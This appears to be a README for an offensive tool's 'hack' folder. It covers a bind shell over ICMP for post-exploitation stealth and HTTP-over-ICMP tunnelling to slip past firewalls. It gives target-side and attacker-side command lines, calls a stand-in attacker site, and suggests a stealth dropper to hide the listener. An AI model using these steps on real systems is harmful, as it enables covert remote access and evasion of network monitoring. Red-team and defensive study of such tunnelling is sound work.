# Hack

Some fun things using `QueenSono`

* Bind shell
* Http over ICMP tunneling
  * For a much more sophisticated ICMP tunneling solution see [icmptunnel](https://github.com/DhavalKapil/icmptunnel)

## Bind Shell
<h5 align="center">In <code>QueenSono/hack/bindshell</code></h5>

<p align="center"><i> It is a "bind shell" through ICMP so it is quite ordinary if it takes time or if all commands are not well treated</i></p>

### Use case
***In Post exploitation phase:*** Sometimes, and for the post exploitation phase it is more suited, you need a bind shell. if ICMP is less monitored than other protocol (eg TCP), having a bind shell trough `QueenSono` is more stealthy.

#### How to do it?

![demo](https://github.com/ariary/QueenSono/blob/main/img/qssono-bindshell.gif)
On both machines you need to have `qssender`and `qsreceiver`

*> On the target machine:* Launch your listener
```
./listener.sh <ip_listening_for_icmp>
```

*> On the attacker machine:* Bind to the target shell
```
./bindshell.sh <ip_target> <ip_listening_for_icmp>
```

*Product placement: To be stealthly, you `listener` should use a dropper and hide its presence. You could find a stealth dropper example in [curlNExec](https://github.com/ariary/curlNexec) repo. Should I adapt it to use ICMP ? 🤔*

## HTTP over ICMP tunneling


<h5 align="center">In <code>QueenSono/hack/tunneling</code></h5>

<p align="center"><i> Access internet by tunneling HTTP request with ICMP</i></p>

### Use case
* Access internet but firewall rules block http traffic but allow icmp 
* If you want to hide your http tracks 

#### How to do it?
```
need cap_net_raw cap         need internet access

        ┌───────────┐         ┌───────────────┐           ┌────────────┐
        │           │    1    │               │    2      │            │
        │  qscurl   └─────────►    qsproxy    └───────────►World  wide │
        │           ◄─────────┐               ◄───────────┐    web     │
        └───────────┘    4    └───────────────┘     3     │            │
                                                          └────────────┘
```

*> On the attacker machine:* Launch the proxy
```
./qsproxy.sh <ip_listening>
```

*> On the target machine:* Order a curl request to be performed by attacker machine
```
# before modify qscurl.sh with according LISTEN and REMOTE addresses
./qscurl.sh http://myawesomeattacersite.com -H \"toto:titi\"
```

